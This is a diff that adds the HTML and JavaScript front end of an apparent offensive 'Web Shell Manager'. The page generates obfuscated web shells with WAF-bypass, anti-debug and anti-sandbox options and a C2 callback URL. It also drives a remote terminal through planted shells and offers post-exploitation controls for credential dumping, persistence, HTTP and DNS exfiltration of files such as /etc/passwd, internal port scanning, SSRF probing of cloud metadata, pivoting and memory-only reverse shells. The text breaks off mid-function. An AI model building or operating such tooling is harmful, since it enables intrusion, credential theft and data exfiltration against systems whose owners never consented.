@@ -1,0 +1,1452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Shell Manager - CyberApp</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            color: #e0e0e0;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        /* Header */
+        .header {
+            background: rgba(0, 0, 0, 0.8);
+            border-bottom: 2px solid #ff4444;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header h1 {
+            color: #ff4444;
+            font-size: 1.5em;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .header h1::before {
+            content: "🐚";
+        }
+        
+        .back-btn {
+            background: linear-gradient(135deg, #333, #444);
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+        
+        .back-btn:hover {
+            background: linear-gradient(135deg, #444, #555);
+            transform: translateY(-2px);
+        }
+        
+        /* Main Container */
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+            display: grid;
+            grid-template-columns: 350px 1fr;
+            gap: 20px;
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            background: rgba(20, 20, 35, 0.9);
+            border-radius: 15px;
+            border: 1px solid #ff444440;
+            padding: 20px;
+            height: fit-content;
+            position: sticky;
+            top: 80px;
+        }
+        
+        .sidebar h3 {
+            color: #ff4444;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #ff444440;
+        }
+        
+        /* Form Controls */
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #aaa;
+            margin-bottom: 5px;
+            font-size: 0.9em;
+        }
+        
+        .form-group select,
+        .form-group input,
+        .form-group textarea {
+            width: 100%;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #444;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 0.9em;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group select:focus,
+        .form-group input:focus,
+        .form-group textarea:focus {
+            outline: none;
+            border-color: #ff4444;
+        }
+        
+        /* Checkboxes */
+        .checkbox-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 5px;
+        }
+        
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 0.8em;
+        }
+        
+        .checkbox-item input[type="checkbox"] {
+            width: auto;
+            accent-color: #ff4444;
+        }
+        
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1em;
+            transition: all 0.3s;
+            margin-bottom: 10px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #ff4444, #cc0000);
+            color: #fff;
+        }
+        
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #ff6666, #dd2222);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(255, 68, 68, 0.4);
+        }
+        
+        .btn-secondary {
+            background: linear-gradient(135deg, #444, #333);
+            color: #fff;
+        }
+        
+        .btn-secondary:hover {
+            background: linear-gradient(135deg, #555, #444);
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #00cc66, #009944);
+            color: #fff;
+        }
+        
+        .btn-warning {
+            background: linear-gradient(135deg, #ffaa00, #cc8800);
+            color: #000;
+        }
+        
+        /* Main Content */
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        /* Tabs */
+        .tabs {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .tab {
+            background: rgba(40, 40, 60, 0.8);
+            color: #aaa;
+            padding: 12px 24px;
+            border: 1px solid #444;
+            border-radius: 10px 10px 0 0;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+        
+        .tab:hover {
+            background: rgba(60, 60, 80, 0.8);
+            color: #fff;
+        }
+        
+        .tab.active {
+            background: rgba(255, 68, 68, 0.2);
+            color: #ff4444;
+            border-color: #ff4444;
+            border-bottom-color: transparent;
+        }
+        
+        /* Panels */
+        .panel {
+            background: rgba(20, 20, 35, 0.9);
+            border-radius: 0 15px 15px 15px;
+            border: 1px solid #ff444440;
+            padding: 25px;
+            display: none;
+        }
+        
+        .panel.active {
+            display: block;
+        }
+        
+        .panel h2 {
+            color: #ff4444;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        /* Output Areas */
+        .output-area {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 15px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.85em;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .output-area.success {
+            border-color: #00cc66;
+        }
+        
+        .output-area.error {
+            border-color: #ff4444;
+            color: #ff6666;
+        }
+        
+        /* Code Block */
+        .code-block {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 15px;
+            position: relative;
+            margin-top: 10px;
+        }
+        
+        .code-block pre {
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.85em;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            color: #00ff00;
+        }
+        
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #333;
+            color: #fff;
+            border: none;
+            padding: 5px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.8em;
+        }
+        
+        .copy-btn:hover {
+            background: #444;
+        }
+        
+        /* Session List */
+        .session-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .session-item {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #444;
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .session-item.active {
+            border-color: #00cc66;
+        }
+        
+        .session-info h4 {
+            color: #fff;
+            margin-bottom: 5px;
+        }
+        
+        .session-info span {
+            color: #888;
+            font-size: 0.85em;
+        }
+        
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #444;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .stat-card h3 {
+            font-size: 2em;
+            color: #ff4444;
+            margin-bottom: 5px;
+        }
+        
+        .stat-card span {
+            color: #888;
+            font-size: 0.9em;
+        }
+        
+        /* Terminal */
+        .terminal {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .terminal-header {
+            background: #1a1a1a;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .terminal-dot.red { background: #ff5f56; }
+        .terminal-dot.yellow { background: #ffbd2e; }
+        .terminal-dot.green { background: #27c93f; }
+        
+        .terminal-body {
+            padding: 15px;
+            min-height: 300px;
+            max-height: 500px;
+            overflow-y: auto;
+            font-family: 'Consolas', monospace;
+            font-size: 0.9em;
+        }
+        
+        .terminal-input {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 15px;
+            background: #0a0a0a;
+            border-top: 1px solid #333;
+        }
+        
+        .terminal-input span {
+            color: #00ff00;
+        }
+        
+        .terminal-input input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-family: 'Consolas', monospace;
+            font-size: 0.9em;
+        }
+        
+        .terminal-input input:focus {
+            outline: none;
+        }
+        
+        /* Scan Results */
+        .scan-results {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .port-item {
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: bold;
+        }
+        
+        .port-item.open {
+            background: rgba(0, 204, 102, 0.2);
+            border: 1px solid #00cc66;
+            color: #00cc66;
+        }
+        
+        .port-item.closed {
+            background: rgba(255, 68, 68, 0.1);
+            border: 1px solid #444;
+            color: #666;
+        }
+        
+        /* Alerts */
+        .alert {
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .alert-warning {
+            background: rgba(255, 170, 0, 0.2);
+            border: 1px solid #ffaa00;
+            color: #ffaa00;
+        }
+        
+        .alert-danger {
+            background: rgba(255, 68, 68, 0.2);
+            border: 1px solid #ff4444;
+            color: #ff4444;
+        }
+        
+        .alert-success {
+            background: rgba(0, 204, 102, 0.2);
+            border: 1px solid #00cc66;
+            color: #00cc66;
+        }
+        
+        /* Loading */
+        .loading {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 20px;
+        }
+        
+        .loading.active {
+            display: flex;
+        }
+        
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid #333;
+            border-top-color: #ff4444;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Feature Cards */
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+        }
+        
+        .feature-card {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #444;
+            border-radius: 15px;
+            padding: 20px;
+            transition: all 0.3s;
+        }
+        
+        .feature-card:hover {
+            border-color: #ff4444;
+            transform: translateY(-5px);
+        }
+        
+        .feature-card h4 {
+            color: #ff4444;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .feature-card p {
+            color: #888;
+            font-size: 0.9em;
+            margin-bottom: 15px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 1200px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+            
+            .sidebar {
+                position: static;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .tabs {
+                flex-direction: column;
+            }
+            
+            .tab {
+                border-radius: 10px;
+            }
+            
+            .panel {
+                border-radius: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Web Shell Manager</h1>
+        <a href="/dashboard" class="back-btn">← Dashboard</a>
+    </div>
+    
+    <div class="container">
+        <!-- Sidebar - Shell Generator -->
+        <div class="sidebar">
+            <h3>🔧 Shell Generator</h3>
+            
+            <div class="form-group">
+                <label>Shell Type</label>
+                <select id="shellType">
+                    <option value="php">PHP</option>
+                    <option value="aspx">ASPX (C#)</option>
+                    <option value="asp">Classic ASP</option>
+                    <option value="jsp">JSP (Java)</option>
+                    <option value="py">Python</option>
+                    <option value="js">Node.js</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label>Obfuscation Level</label>
+                <select id="obfuscationLevel">
+                    <option value="0">0 - None</option>
+                    <option value="1">1 - Low</option>
+                    <option value="2">2 - Medium</option>
+                    <option value="3" selected>3 - High</option>
+                    <option value="4">4 - Paranoid</option>
+                    <option value="5">5 - AI Enhanced</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label>Password (Optional)</label>
+                <input type="text" id="shellPassword" placeholder="Authentication password">
+            </div>
+            
+            <div class="form-group">
+                <label>Evasion Techniques</label>
+                <div class="checkbox-group">
+                    <label class="checkbox-item">
+                        <input type="checkbox" value="chunked_transfer" checked> Chunked
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" value="sleep_injection" checked> Sleep
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" value="string_concat" checked> Concat
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" value="base64_chunks"> Base64
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" value="unicode_encoding"> Unicode
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" value="gzip_compression"> Gzip
+                    </label>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label>Options</label>
+                <div class="checkbox-group">
+                    <label class="checkbox-item">
+                        <input type="checkbox" id="antiDebug" checked> Anti-Debug
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" id="antiSandbox" checked> Anti-Sandbox
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" id="encryptedComms" checked> Encrypted
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" id="selfDestruct"> Self-Destruct
+                    </label>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label>Callback URL (Optional)</label>
+                <input type="text" id="callbackUrl" placeholder="http://your-c2-server/callback">
+            </div>
+            
+            <button class="btn btn-primary" onclick="generateShell()">
+                🐚 Generate Shell
+            </button>
+            
+            <button class="btn btn-secondary" onclick="loadDemo()">
+                📋 Load Demo
+            </button>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Alert -->
+            <div class="alert alert-warning">
+                ⚠️ <strong>Warning:</strong> This tool is for AUTHORIZED SECURITY TESTING ONLY. 
+                Unauthorized use is illegal and may result in prosecution.
+            </div>
+            
+            <!-- Tabs -->
+            <div class="tabs">
+                <div class="tab active" data-tab="generator">🔧 Generator</div>
+                <div class="tab" data-tab="terminal">💻 Terminal</div>
+                <div class="tab" data-tab="postexploit">🎯 Post-Exploit</div>
+                <div class="tab" data-tab="sessions">📡 Sessions</div>
+                <div class="tab" data-tab="reverse">🔄 Reverse Shell</div>
+            </div>
+            
+            <!-- Generator Panel -->
+            <div class="panel active" id="generator">
+                <h2>🐚 Generated Shell</h2>
+                
+                <div class="loading" id="generateLoading">
+                    <div class="spinner"></div>
+                    <span>Generating obfuscated shell...</span>
+                </div>
+                
+                <div id="shellOutput" style="display: none;">
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <h3 id="shellSize">0</h3>
+                            <span>Bytes</span>
+                        </div>
+                        <div class="stat-card">
+                            <h3 id="shellType">-</h3>
+                            <span>Type</span>
+                        </div>
+                        <div class="stat-card">
+                            <h3 id="shellObfuscation">-</h3>
+                            <span>Obfuscation</span>
+                        </div>
+                        <div class="stat-card">
+                            <h3 id="techniqueCount">0</h3>
+                            <span>Techniques</span>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>MD5 Hash</label>
+                        <input type="text" id="shellMd5" readonly>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>SHA256 Hash</label>
+                        <input type="text" id="shellSha256" readonly>
+                    </div>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode()">📋 Copy</button>
+                        <pre id="shellCode"></pre>
+                    </div>
+                    
+                    <div style="margin-top: 15px; display: flex; gap: 10px;">
+                        <button class="btn btn-success" onclick="downloadShell()">
+                            ⬇️ Download Shell
+                        </button>
+                        <button class="btn btn-warning" onclick="testWafBypass()">
+                            🛡️ Test WAF Bypass
+                        </button>
+                    </div>
+                </div>
+                
+                <div id="noShell">
+                    <div class="feature-grid">
+                        <div class="feature-card">
+                            <h4>🤖 AI Obfuscation</h4>
+                            <p>Advanced AI-powered code mutation to evade signature detection</p>
+                            <button class="btn btn-secondary" onclick="document.getElementById('obfuscationLevel').value='5'">
+                                Enable AI
+                            </button>
+                        </div>
+                        <div class="feature-card">
+                            <h4>🛡️ WAF Bypass</h4>
+                            <p>Multiple evasion techniques: chunked transfer, sleep injection, encoding</p>
+                            <button class="btn btn-secondary" onclick="selectAllEvasion()">
+                                Select All
+                            </button>
+                        </div>
+                        <div class="feature-card">
+                            <h4>🔐 Encrypted Comms</h4>
+                            <p>AES-256 encrypted request/response communication</p>
+                            <button class="btn btn-secondary" onclick="document.getElementById('encryptedComms').checked=true">
+                                Enable
+                            </button>
+                        </div>
+                        <div class="feature-card">
+                            <h4>🕵️ Anti-Analysis</h4>
+                            <p>Debugger detection, sandbox evasion, timing checks</p>
+                            <button class="btn btn-secondary" onclick="enableAntiAnalysis()">
+                                Enable All
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Terminal Panel -->
+            <div class="panel" id="terminal">
+                <h2>💻 Remote Terminal</h2>
+                
+                <div class="form-group">
+                    <label>Shell URL</label>
+                    <div style="display: flex; gap: 10px;">
+                        <input type="text" id="terminalUrl" placeholder="http://target.com/shell.php" style="flex: 1;">
+                        <input type="text" id="terminalPassword" placeholder="Password" style="width: 150px;">
+                        <button class="btn btn-primary" onclick="connectTerminal()" style="width: auto; margin: 0;">
+                            🔌 Connect
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-dot red"></div>
+                        <div class="terminal-dot yellow"></div>
+                        <div class="terminal-dot green"></div>
+                        <span style="margin-left: 10px; color: #888;">webshell@target</span>
+                    </div>
+                    <div class="terminal-body" id="terminalOutput">
+                        <div style="color: #888;">Welcome to Web Shell Terminal</div>
+                        <div style="color: #888;">Connect to a shell to start executing commands</div>
+                        <br>
+                    </div>
+                    <div class="terminal-input">
+                        <span>$</span>
+                        <input type="text" id="terminalCommand" placeholder="Enter command..." onkeypress="handleTerminalKey(event)">
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Post-Exploitation Panel -->
+            <div class="panel" id="postexploit">
+                <h2>🎯 Post-Exploitation</h2>
+                
+                <div class="feature-grid">
+                    <!-- Port Scanner -->
+                    <div class="feature-card">
+                        <h4>🔍 Port Scanner</h4>
+                        <p>Scan internal network from compromised host</p>
+                        <div class="form-group">
+                            <input type="text" id="scanHost" placeholder="Target IP (e.g., 192.168.1.1)">
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="scanPorts" placeholder="Ports (e.g., 22,80,443)" value="21,22,80,443,445,3389">
+                        </div>
+                        <button class="btn btn-primary" onclick="runPortScan()">
+                            🔍 Scan Ports
+                        </button>
+                        <div class="scan-results" id="scanResults"></div>
+                    </div>
+                    
+                    <!-- SSRF Probe -->
+                    <div class="feature-card">
+                        <h4>🌐 SSRF Probe</h4>
+                        <p>Probe internal URLs via SSRF</p>
+                        <div class="form-group">
+                            <input type="text" id="ssrfUrl" placeholder="http://169.254.169.254/latest/meta-data/">
+                        </div>
+                        <button class="btn btn-primary" onclick="runSsrfProbe()">
+                            🌐 Probe URL
+                        </button>
+                    </div>
+                    
+                    <!-- Credential Dump -->
+                    <div class="feature-card">
+                        <h4>🔑 Credential Dump</h4>
+                        <p>Dump web configs, database credentials, SSH keys</p>
+                        <button class="btn btn-warning" onclick="dumpCredentials()">
+                            🔑 Dump Credentials
+                        </button>
+                    </div>
+                    
+                    <!-- Persistence -->
+                    <div class="feature-card">
+                        <h4>🔒 Persistence</h4>
+                        <p>Establish persistent access</p>
+                        <div class="form-group">
+                            <select id="persistMethod">
+                                <option value="cron">Cron Job (Linux)</option>
+                                <option value="startup">Startup (Windows)</option>
+                                <option value="service">Systemd Service</option>
+                            </select>
+                        </div>
+                        <button class="btn btn-warning" onclick="establishPersistence()">
+                            🔒 Establish Persistence
+                        </button>
+                    </div>
+                    
+                    <!-- File Exfil -->
+                    <div class="feature-card">
+                        <h4>📤 Data Exfiltration</h4>
+                        <p>Exfiltrate files from target</p>
+                        <div class="form-group">
+                            <input type="text" id="exfilPath" placeholder="/etc/passwd">
+                        </div>
+                        <div class="form-group">
+                            <select id="exfilMethod">
+                                <option value="http">HTTP (Base64)</option>
+                                <option value="dns">DNS Chunks</option>
+                            </select>
+                        </div>
+                        <button class="btn btn-primary" onclick="exfiltrateData()">
+                            📤 Exfiltrate
+                        </button>
+                    </div>
+                    
+                    <!-- Pivot -->
+                    <div class="feature-card">
+                        <h4>🔀 Network Pivot</h4>
+                        <p>Set up pivot through compromised host</p>
+                        <div class="form-group">
+                            <input type="text" id="pivotTarget" placeholder="Target IP:Port">
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="pivotLocal" placeholder="Local Port" value="8888">
+                        </div>
+                        <button class="btn btn-primary" onclick="setupPivot()">
+                            🔀 Setup Pivot
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="output-area" id="postExploitOutput" style="margin-top: 20px; min-height: 200px;">
+                    Post-exploitation output will appear here...
+                </div>
+            </div>
+            
+            <!-- Sessions Panel -->
+            <div class="panel" id="sessions">
+                <h2>📡 Active Sessions</h2>
+                
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <h3 id="totalSessions">0</h3>
+                        <span>Active Sessions</span>
+                    </div>
+                    <div class="stat-card">
+                        <h3 id="totalShells">0</h3>
+                        <span>Generated Shells</span>
+                    </div>
+                </div>
+                
+                <div class="session-list" id="sessionList">
+                    <div style="color: #888; text-align: center; padding: 40px;">
+                        No active sessions. Connect to a shell to start.
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Reverse Shell Panel -->
+            <div class="panel" id="reverse">
+                <h2>🔄 Memory-Only Reverse Shell</h2>
+                
+                <div class="alert alert-danger">
+                    ⚠️ <strong>Memory-Only:</strong> These shells execute entirely in memory with no disk artifacts.
+                </div>
+                
+                <div class="feature-grid">
+                    <div class="feature-card">
+                        <h4>⚙️ Configuration</h4>
+                        <div class="form-group">
+                            <label>Listener Host</label>
+                            <input type="text" id="reverseHost" placeholder="Your IP address">
+                        </div>
+                        <div class="form-group">
+                            <label>Listener Port</label>
+                            <input type="number" id="reversePort" value="4444">
+                        </div>
+                        <div class="form-group">
+                            <label>Shell Type</label>
+                            <select id="reverseType">
+                                <option value="php">PHP</option>
+                                <option value="powershell">PowerShell</option>
+                                <option value="python">Python</option>
+                            </select>
+                        </div>
+                        <button class="btn btn-primary" onclick="generateReverseShell()">
+                            🔄 Generate Reverse Shell
+                        </button>
+                    </div>
+                    
+                    <div class="feature-card" id="reverseOutput" style="display: none;">
+                        <h4>📋 Generated Payload</h4>
+                        <div class="code-block" style="max-height: 300px; overflow-y: auto;">
+                            <button class="copy-btn" onclick="copyReverseShell()">📋 Copy</button>
+                            <pre id="reverseCode"></pre>
+                        </div>
+                        <div style="margin-top: 15px;">
+                            <strong>Listener Command:</strong>
+                            <code id="listenerCmd" style="display: block; margin-top: 5px; color: #00ff00;"></code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Tab switching
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+                
+                tab.classList.add('active');
+                document.getElementById(tab.dataset.tab).classList.add('active');
+            });
+        });
+        
+        // Current session
+        let currentSession = null;
+        let generatedShell = null;
+        
+        // Generate shell
+        async function generateShell() {
+            const loading = document.getElementById('generateLoading');
+            const output = document.getElementById('shellOutput');
+            const noShell = document.getElementById('noShell');
+            
+            loading.classList.add('active');
+            output.style.display = 'none';
+            noShell.style.display = 'none';
+            
+            const evasionCheckboxes = document.querySelectorAll('.checkbox-group input[type="checkbox"][value]');
+            const evasion = Array.from(evasionCheckboxes)
+                .filter(cb => cb.checked)
+                .map(cb => cb.value);
+            
+            const data = {
+                type: document.getElementById('shellType').value,
+                obfuscation: parseInt(document.getElementById('obfuscationLevel').value),
+                password: document.getElementById('shellPassword').value,
+                evasion: evasion,
+                callback_url: document.getElementById('callbackUrl').value || null,
+                anti_debug: document.getElementById('antiDebug').checked,
+                anti_sandbox: document.getElementById('antiSandbox').checked,
+                encrypted_comms: document.getElementById('encryptedComms').checked,
+                self_destruct: document.getElementById('selfDestruct').checked
+            };
+            
+            try {
+                const response = await fetch('/api/webshell/generate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    generatedShell = result.payload;
+                    
+                    document.getElementById('shellSize').textContent = result.payload.size_bytes;
+                    document.getElementById('shellType').textContent = result.payload.type.toUpperCase();
+                    document.getElementById('shellObfuscation').textContent = result.payload.obfuscation;
+                    document.getElementById('techniqueCount').textContent = result.payload.techniques.length;
+                    document.getElementById('shellMd5').value = result.payload.hash_md5;
+                    document.getElementById('shellSha256').value = result.payload.hash_sha256;
+                    document.getElementById('shellCode').textContent = result.payload.code;
+                    
+                    output.style.display = 'block';
+                } else {
+                    alert('Error: ' + result.error);
+                    noShell.style.display = 'block';
+                }
+            } catch (error) {
+                alert('Error: ' + error.message);
+                noShell.style.display = 'block';
+            }
+            
+            loading.classList.remove('active');
+        }
+        
+        // Load demo
+        async function loadDemo() {
+            try {
+                const response = await fetch('/api/webshell/demo');
+                const result = await response.json();
+                
+                if (result.success) {
+                    document.getElementById('shellOutput').style.display = 'block';
+                    document.getElementById('noShell').style.display = 'none';
+                    
+                    document.getElementById('shellSize').textContent = result.demo.size_bytes;
+                    document.getElementById('shellType').textContent = result.demo.type.toUpperCase();
+                    document.getElementById('shellObfuscation').textContent = result.demo.obfuscation;
+                    document.getElementById('techniqueCount').textContent = result.demo.techniques.length;
+                    document.getElementById('shellMd5').value = result.demo.hash_md5;
+                    document.getElementById('shellCode').textContent = result.demo.preview;
+                    
+                    generatedShell = { code: result.demo.preview, type: result.demo.type };
+                }
+            } catch (error) {
+                alert('Error loading demo: ' + error.message);
+            }
+        }
+        
+        // Copy code
+        function copyCode() {
+            const code = document.getElementById('shellCode').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                alert('Code copied to clipboard!');
+            });
+        }
+        
+        // Download shell
+        function downloadShell() {
+            if (!generatedShell) return;
+            
+            const extensions = {
+                php: '.php',
+                aspx: '.aspx',
+                asp: '.asp',
+                jsp: '.jsp',
+                py: '.py',
+                js: '.js'
+            };
+            
+            const ext = extensions[generatedShell.type] || '.txt';
+            const blob = new Blob([generatedShell.code], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'shell' + ext;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+        
+        // Select all evasion
+        function selectAllEvasion() {
+            document.querySelectorAll('.checkbox-group input[type="checkbox"][value]').forEach(cb => {
+                cb.checked = true;
+            });
+        }
+        
+        // Enable anti-analysis
+        function enableAntiAnalysis() {
+            document.getElementById('antiDebug').checked = true;
+            document.getElementById('antiSandbox').checked = true;
+        }
+        
+        // Terminal functions
+        async function connectTerminal() {
+            const url = document.getElementById('terminalUrl').value;
+            const password = document.getElementById('terminalPassword').value;
+            
+            if (!url) {
+                alert('Please enter shell URL');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/webshell/connect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ url, password })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    currentSession = result.session_id;
+                    appendTerminal('Connected! Session ID: ' + result.session_id, 'success');
+                    appendTerminal('System Info: ' + JSON.stringify(result.system_info, null, 2), 'info');
+                } else {
+                    appendTerminal('Connection failed: ' + result.error, 'error');
+                }
+            } catch (error) {
+                appendTerminal('Error: ' + error.message, 'error');
+            }
+        }
+        
+        function handleTerminalKey(event) {
+            if (event.key === 'Enter') {
+                executeTerminalCommand();
+            }
+        }
+        
+        async function executeTerminalCommand() {
+            const input = document.getElementById('terminalCommand');
+            const command = input.value.trim();
+            
+            if (!command) return;
+            
+            appendTerminal('$ ' + command, 'command');
+            input.value = '';
+            
+            if (!currentSession && !document.getElementById('terminalUrl').value) {
+                appendTerminal('Error: Not connected to any shell', 'error');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/webshell/execute', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        session_id: currentSession,
+                        url: document.getElementById('terminalUrl').value,
+                        password: document.getElementById('terminalPassword').value,
+                        command: command
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    appendTerminal(result.output || '(no output)', 'output');
+                } else {
+                    appendTerminal('Error: ' + result.error, 'error');
+                }
+            } catch (error) {
+                appendTerminal('Error: ' + error.message, 'error');
+            }
+        }
+        
+        function appendTerminal(text, type) {
+            const output = document.getElementById('terminalOutput');
+            const div = document.createElement('div');
+            div.textContent = text;
+            
+            if (type === 'error') div.style.color = '#ff4444';
+            else if (type === 'success') div.style.color = '#00cc66';
+            else if (type === 'command') div.style.color = '#00ff00';
+            else if (type === 'info') div.style.color = '#00aaff';
+            
+            output.appendChild(div);
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        // Post-exploitation functions
+        async function runPortScan() {
+            const host = document.getElementById('scanHost').value;
+            const portsStr = document.getElementById('scanPorts').value;
+            
+            if (!host) {
+                alert('Please enter target host');
+                return;
+            }
+            
+            const ports = portsStr.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p));
+            
+            updatePostExploitOutput('Scanning ' + host + '...');
+            
+            try {
+                const response = await fetch('/api/webshell/scan', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        session_id: currentSession,
+                        url: document.getElementById('terminalUrl').value,
+                        password: document.getElementById('terminalPassword').value,
+                        host: host,
+                        ports: ports
+                    })
+                });
+                
+                const result = await response.json();
+                
